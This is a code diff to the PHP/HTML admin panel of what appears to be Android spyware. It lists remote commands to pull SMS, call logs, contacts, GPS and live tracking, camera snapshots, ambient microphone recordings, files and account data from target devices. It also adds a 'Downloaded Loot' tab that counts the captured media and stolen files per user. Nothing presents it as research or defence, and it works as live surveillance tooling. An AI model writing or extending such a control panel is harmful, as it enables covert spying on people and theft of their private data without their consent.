@@ -81,7 +81,11 @@
                                 <i class="fas fa-cogs mr-1"></i> Device Management
                             </a>
                         </li>
-
+                        <li class="nav-item">
+                            <a class="nav-link" data-toggle="tab" href="#tab-loot-stats" role="tab">
+                                <i class="fas fa-chart-bar mr-1"></i> Downloaded Loot
+                            </a>
+                        </li>
                     </ul>
                 </div>
 
@@ -96,26 +100,21 @@
                             </div>
                             <div class="row" id="admin-fetch-grid">
                                 <?php
-                                $fetchCmds = [
-                                    ['id' => 'sms',           'label' => 'Fetch SMS',      'icon' => 'fa-sms',            'color' => '#007bff', 'desc' => 'All SMS messages'],
-                                    ['id' => 'calls',         'label' => 'Call Logs',      'icon' => 'fa-phone-alt',      'color' => '#28a745', 'desc' => 'Full call history'],
-                                    ['id' => 'contacts',      'label' => 'Contacts',       'icon' => 'fa-address-book',   'color' => '#17a2b8', 'desc' => 'Full contact list'],
-                                    ['id' => 'search_data',   'label' => 'Keyword Search', 'icon' => 'fa-search',         'color' => '#00acc1', 'desc' => 'Search SMS/Call data'],
-                                    ['id' => 'capture_photo', 'label' => 'Camera Snap',    'icon' => 'fa-camera',         'color' => '#d81b60', 'desc' => 'Remote photo capture'],
-                                    ['id' => 'record_audio',  'label' => 'Ambient Audio',  'icon' => 'fa-microphone',     'color' => '#ff8f00', 'desc' => 'Record environment audio'],
-                                    ['id' => 'files',         'label' => 'File List',      'icon' => 'fa-file-alt',       'color' => '#20c997', 'desc' => 'Recent files'],
-                                    ['id' => 'fetch_file',    'label' => 'Targeted File',  'icon' => 'fa-file-download',  'color' => '#00897b', 'desc' => 'Fetch specific file'],
-                                    ['id' => 'location',      'label' => 'GPS Location',   'icon' => 'fa-map-marker-alt', 'color' => '#dc3545', 'desc' => 'Precise location'],
-                                    ['id' => 'start_tracking','label' => 'Live Tracking',  'icon' => 'fa-route',          'color' => '#e53935', 'desc' => 'Real-time GPS'],
-                                    ['id' => 'context',       'label' => 'Context',        'icon' => 'fa-walking',        'color' => '#e83e8c', 'desc' => 'Motion & state'],
-                                    ['id' => 'apps',          'label' => 'Apps List',      'icon' => 'fa-th-large',       'color' => '#6f42c1', 'desc' => 'Installed apps'],
-                                    ['id' => 'usage',         'label' => 'App Usage',      'icon' => 'fa-chart-pie',      'color' => '#6610f2', 'desc' => 'Screen-time stats'],
-                                    ['id' => 'notifications', 'label' => 'Notifications',  'icon' => 'fa-bell',           'color' => '#ffc107', 'desc' => 'Status bar alerts'],
-                                    ['id' => 'device_info',   'label' => 'Device Info',    'icon' => 'fa-info-circle',    'color' => '#6c757d', 'desc' => 'Hardware & build'],
-                                    ['id' => 'misc_hardware', 'label' => 'Misc Hardware',  'icon' => 'fa-microchip',      'color' => '#117a8b', 'desc' => 'Sensors, network, Bluetooth'],
-                                    ['id' => 'misc_software', 'label' => 'Misc Software',  'icon' => 'fa-calendar-alt',   'color' => '#fd7e14', 'desc' => 'Calendar, locale, accounts'],
-                                    ['id' => 'beep',          'label' => 'Test Beep',      'icon' => 'fa-volume-up',      'color' => '#8e44ad', 'desc' => 'Play a beep sound'],
-                                    ['id' => 'all',           'label' => 'Sync All',       'icon' => 'fa-sync-alt',       'color' => '#b21f2d', 'desc' => 'Full extraction'],
+                                 $fetchCmds = [
+                                    ['id' => 'contacts',      'label' => 'Contacts',       'icon' => 'fa-address-book',   'color' => '#17a2b8', 'desc' => 'Phonebook contacts'],
+                                    ['id' => 'beep',          'label' => 'Test Beep',      'icon' => 'fa-volume-up',      'color' => '#8e44ad', 'desc' => 'Play audible test beep'],
+                                    ['id' => 'health_check',  'label' => 'Device Health',  'icon' => 'fa-heartbeat',      'color' => '#e53935', 'desc' => 'Instant battery/network check'],
+                                    ['id' => 'apps',          'label' => 'Apps List',      'icon' => 'fa-th-large',       'color' => '#6f42c1', 'desc' => 'Installed packages list'],
+                                    ['id' => 'calls',         'label' => 'Calls Logs',     'icon' => 'fa-phone-alt',      'color' => '#28a745', 'desc' => 'Call history list'],
+                                    ['id' => 'sms',           'label' => 'SMS Messages',   'icon' => 'fa-sms',            'color' => '#007bff', 'desc' => 'Text messages logs'],
+                                    ['id' => 'location',      'label' => 'Location & Act', 'icon' => 'fa-map-marker-alt', 'color' => '#dc3545', 'desc' => 'GPS & activity logs'],
+                                    ['id' => 'telemetry_soft','label' => 'Usage & Notifs', 'icon' => 'fa-chart-pie',      'color' => '#6610f2', 'desc' => 'Screen time & status alerts'],
+                                    ['id' => 'capture_photo', 'label' => 'Camera Capture', 'icon' => 'fa-camera',         'color' => '#d81b60', 'desc' => 'Snapshot from camera'],
+                                    ['id' => 'record_audio',  'label' => 'Audio Capture',  'icon' => 'fa-microphone',     'color' => '#ff8f00', 'desc' => 'Ambient mic clip record'],
+                                    ['id' => 'files',         'label' => 'Device Files',   'icon' => 'fa-file-alt',       'color' => '#20c997', 'desc' => 'System filesystem files'],
+                                    ['id' => 'software_misc', 'label' => 'Misc Software',  'icon' => 'fa-calendar-alt',   'color' => '#fd7e14', 'desc' => 'Calendar, locale, accounts'],
+                                    ['id' => 'hardware_misc', 'label' => 'Misc Hardware',  'icon' => 'fa-microchip',      'color' => '#117a8b', 'desc' => 'Bluetooth, sensors, thermal'],
+                                    ['id' => 'all',           'label' => 'Sync All',       'icon' => 'fa-sync-alt',       'color' => '#b21f2d', 'desc' => 'Trigger all extractors'],
                                 ];
                                 foreach ($fetchCmds as $c):
                                 ?>
@@ -215,7 +214,70 @@
                             </div><!-- /.row -->
                         </div><!-- /.tab-pane#tab-mgmt -->
 
-
+                        <!-- ====================== TAB 3: DOWNLOADED LOOT STATS ====================== -->
+                        <div class="tab-pane fade" id="tab-loot-stats" role="tabpanel">
+                            <div class="alert alert-light border-left-info border mb-4">
+                                <i class="fas fa-info-circle text-info mr-2"></i>
+                                Summary statistics of extracted captured media and downloaded files per user.
+                            </div>
+                            
+                            <div class="table-responsive">
+                                <table class="table table-hover table-striped">
+                                    <thead>
+                                        <tr>
+                                            <th>User</th>
+                                            <th class="text-center">Capture Count</th>
+                                            <th class="text-center">Capture Size</th>
+                                            <th class="text-center">Downloaded Files</th>
+                                            <th class="text-center">Files Size</th>
+                                            <th class="text-center">Total Stats</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        <?php if (empty($stats)): ?>
+                                        <tr>
+                                            <td colspan="6" class="text-center py-4 text-muted">No data stats found.</td>
+                                        </tr>
+                                        <?php else: ?>
+                                            <?php foreach ($stats as $s): 
+                                                $total_count = $s['media_count'] + $s['files_count'];
+                                                $total_size = $s['media_size'] + $s['files_size'];
+                                                
+                                                $formatSize = function($bytes) {
+                                                    if ($bytes < 1024) return $bytes . ' B';
+                                                    elseif ($bytes < 1048576) return round($bytes / 1024, 1) . ' KB';
+                                                    else return round($bytes / 1048576, 1) . ' MB';
+                                                };
+                                            ?>
+                                            <tr>
+                                                <td>
+                                                    <strong><?= htmlspecialchars($s['username']) ?></strong>
+                                                    <small class="text-muted d-block">ID: #<?= $s['id'] ?></small>
+                                                </td>
+                                                <td class="text-center font-weight-bold text-primary">
+                                                    <?= $s['media_count'] ?>
+                                                </td>
+                                                <td class="text-center text-muted">
+                                                    <?= $formatSize($s['media_size']) ?>
+                                                </td>
+                                                <td class="text-center font-weight-bold text-success">
+                                                    <?= $s['files_count'] ?>
+                                                </td>
+                                                <td class="text-center text-muted">
+                                                    <?= $formatSize($s['files_size']) ?>
+                                                </td>
+                                                <td class="text-center">
+                                                    <span class="badge badge-info px-2 py-1">
+                                                        <?= $total_count ?> files / <?= $formatSize($total_size) ?>
+                                                    </span>
+                                                </td>
+                                            </tr>
+                                            <?php endforeach; ?>
+                                        <?php endif; ?>
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div><!-- /.tab-pane -->
 
                     </div><!-- /.tab-content -->
                 </div><!-- /.card-body -->
